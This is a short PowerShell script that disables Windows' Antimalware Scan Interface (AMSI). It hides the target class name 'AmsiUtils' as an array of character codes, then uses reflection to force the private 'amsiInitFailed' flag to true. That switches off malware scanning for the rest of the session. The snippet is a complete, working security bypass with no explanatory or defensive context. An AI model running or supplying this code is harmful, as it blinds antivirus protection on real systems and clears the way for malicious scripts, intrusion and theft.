$n = [string]::Join('',([char[]](83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115)))

$c = [Ref].Assembly.GetType($n)

$f = $c.GetField("amsiInitFailed", "NonPublic,Static")

$f.SetValue($null, $true)
